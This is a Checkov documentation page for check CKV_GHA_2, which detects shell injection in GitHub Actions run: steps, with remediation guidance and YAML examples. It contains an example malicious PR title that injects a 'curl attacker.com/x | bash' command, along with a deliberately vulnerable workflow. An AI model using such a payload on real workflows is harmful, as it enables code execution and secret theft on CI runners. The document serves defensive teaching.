# CKV_GHA_2: Ensure run commands are not vulnerable to shell injection
## Severity
**CRITICAL** (score: 9.0/10)

A `run:` step interpolating unsanitized untrusted input (e.g. PR titles/branch names) into a shell command is a classic GitHub Actions shell-injection primitive that gives an attacker arbitrary command execution in the workflow runner, including access to secrets and tokens.

## Summary
This check fails when a GitHub Actions `run:` step contains text patterns that indicate untrusted, attacker-influenced context data (like PR titles, issue bodies, or commit messages) is being interpolated directly into a shell command, a classic GitHub Actions script-injection vulnerability.

## Applicability
- **Framework:** GitHub Actions workflow YAML
- **Entities:** `jobs` and `jobs.*.steps[]` — specifically any step with a `run:` key

## Why it matters
GitHub Actions expands `${{ ... }}` expressions **before** the shell ever sees the resulting script. If a workflow interpolates a context value that an external contributor controls — such as `github.event.pull_request.title`, `github.event.issue.body`, `github.head_ref`, or a commit message — directly into a `run:` block, the raw expanded string is spliced into the shell command as literal text, not as a safely-quoted argument. An attacker can craft a PR title like:
```
"; curl attacker.com/x | bash; echo "
```
When that string is substituted into the `run:` script, the injected shell metacharacters (`;`, `` ` ``, `$()`, `&&`, `|`, backticks, newlines) execute as part of the command. This is one of the most common real-world GitHub Actions vulnerabilities (documented extensively by GitHub Security Lab) and has led to secret exfiltration, supply-chain compromise, and full repository takeover in workflows that run with `pull_request_target` or have write access to secrets.

## How Checkov evaluates this
The check (`DontAllowShellInjection`) looks at the step's `run` field (an empty string if absent) and searches it, line by line via regex, against a curated list of "bad input" patterns (`checkov.github_actions.common.shell_injection_list.terms`) — these are typically regexes matching risky `${{ github.event.* }}` / `${{ github.head_ref }}`-style expressions known to carry untrusted, user-controllable content (issue/PR titles and bodies, comment bodies, commit messages, branch names, etc.) when referenced directly inside a `run:` block.
- If `run` is not present, the check **PASSES**.
- If any of the known-risky context expressions is found anywhere in the `run` string, the check **FAILS**.
- Otherwise it **PASSES**.

## Non-compliant example
```yaml
on: pull_request_target

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Greet PR author
        run: |
          echo "Thanks for your PR titled: ${{ github.event.pull_request.title }}"
```

## Remediated example
```yaml
on: pull_request_target

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Greet PR author
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          echo "Thanks for your PR titled: $PR_TITLE"
```

## Remediation steps
1. Never interpolate `${{ github.event.* }}`, `github.head_ref`, or other user-controllable context values directly inside a `run:` script body.
2. Instead, pass the value through an intermediate environment variable (as in the remediated example) — the shell then treats it as data, not as script text, when referenced as `$PR_TITLE` (properly quoted, e.g. `"$PR_TITLE"`).
3. Where possible, avoid `pull_request_target` for workflows that check out and build untrusted PR code; prefer `pull_request` (which runs with restricted, read-only default token permissions and no access to repo secrets) unless you specifically need write access, and if you do, checkout the base ref, not the PR head.
4. Use an action like `actions/github-script` with parameterized inputs instead of shell interpolation when feasible.
5. Re-run Checkov to confirm no risky context expression appears directly inside `run:`.

## References
- Checkov check source: https://github.com/bridgecrewio/checkov/blob/main/checkov/github_actions/checks/job/ShellInjection.py
- GitHub Security Lab write-up on script injection in GitHub Actions: https://securitylab.github.com/resources/github-actions-untrusted-input/
